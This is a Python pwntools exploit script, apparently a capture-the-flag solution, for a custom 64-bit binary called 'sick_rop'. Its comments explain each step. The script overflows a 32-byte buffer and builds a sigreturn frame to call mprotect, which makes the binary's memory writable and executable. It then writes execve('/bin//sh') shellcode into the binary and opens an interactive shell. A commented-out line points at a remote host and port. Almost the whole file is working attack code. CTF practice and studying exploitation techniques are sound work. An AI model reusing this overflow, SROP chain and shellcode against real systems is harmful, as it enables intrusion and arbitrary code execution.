import pwn
import struct

# sick_rop is a 64-bit statically linked binary
# NX is enabled, ASLR is turned on

# sick_rop is a custom (written in asm) binary
# There is an obvious buffer overflow, in which a custom read() function reads 0x300 bytes of input into a 32-byte buffer

# We cannot ret2libc, and there are not nearly enough gadgets to do a classic rop chain
# The solution is to do a sigrop exploit
# We will do a sigrop -> mprotect -> shellcode style exploit

target = pwn.process('./sick_rop')
# target = pwn.remote("167.99.207.150", 30464)
# pwn.gdb.attach(target, gdbscript="b *0x40104e")

pwn.context.arch = "amd64"

# The first problem is that we don't have any gadgets, that let us get values into rax
# To do a sigreturn syscall, we need to get 0xf into rax
# ropper --file sick_rop | grep rax
# But, both the read() syscall, and the write() syscall store their return values in rax
# They both return the number of bytes successfully read/written
# So, we can use these return values, and send 15 bytes, to get 0xf in rax

#################################
#### Sigreturn -> mprotect() ####
#################################

frame_1 = pwn.SigreturnFrame()
syscall = 0x401014 # syscall; ret;

# First, we will do a mprotect syscall to make both of the binaries sections rwx
# This includes instruction memory, 401000 -> 402000

frame_1.rip = syscall # point to a syscall gadget

frame_1.rax = 0x0a # mprotect
frame_1.rdi = 0x400000 # start
frame_1.rsi = 0x2000 # size
frame_1.rdx = 0x7 # rwx perms

# We also need a value for rsp, because right after the syscall at 0x401014 is a ret instruction
# That ret instruction will take the value pointed to by rsp (what should be the top of the stack)
# and put it into rip. We can solve this by putting a pointer to the start of vuln() in rsp, which we can
# find with search-pattern 0x40102e in gdb
ptr_to_vuln = 0x4010d8
frame_1.rsp = ptr_to_vuln

vuln = struct.pack("<Q", 0x40102e) # This is the start of the vuln function

payload1 = b'a' * 40
payload1 += vuln # Will loop back over vuln() to get 0xf into rax
payload1 += struct.pack("<Q", syscall) # sigreturn syscall
payload1 += bytes(frame_1) # sigreturn frame

target.sendline(payload1)
target.recv()
target.sendline(b'b'*14) # Send 15 bytes (14 b's + 1 \n) to get 0xf into rax
target.recv()

###################
#### Shellcode ####
###################

# some basic execve('/bin//sh') shellcode for ya

shellcode =  """mov rdi, 0x68732f6e69622f
                push rdi
                mov rdi, rsp
                mov rax, 0x3b
                xor rsi, rsi
                xor rdx, rdx
                syscall"""
assembled_shellcode = pwn.asm(shellcode)

##############################
#### Getting to Shellcode ####
##############################

# Now we are in an interesting position,
# We are executing vuln() again, but the binary now thinks that the top of the stack is 0x4010d8
# That's a location in instruction memory!
# So, when the binary does pushes, or mov's to stack locations now, its actually going to be destroying instructions
# With that in mind, it means this is our last pass through vuln(), as it is being destroyed as we execute it

# How can we get shellcode into the binary and execute it?
# Remember, this binary's read() function, which is about to be called, reads 0x300 bytes of data into the location pointed at by rsp
# aka, the top of the stack. Before that, it decrements rsp by 0x20 to "make room" lol for the buffer
# We know the address of rsp before it is decremented; we just set it to 0x4010d8
# So we know that the binary is gonna read 300 bytes of data that we supply to 0x4010d8 - 0x20

# We also know, due to the same buffer overflow as before, that the 41st -> 48th bytes of that data will be interpreted as a return address
# 40 = 0x28. 0x20 - 0x28 = -0x8. So that means our return address is at 0x4010d8 + 0x8.
# We can put our shellcode right after that return address: 
# 0x8 + 0x8 = 0x10. So our shellcode is getting placed at 0x4010d8 + 0x10.

payload2 = b'c' * 40
payload2 += struct.pack("<Q", 0x4010d8 + 0x10)
payload2 += assembled_shellcode

target.sendline(payload2)
target.interactive()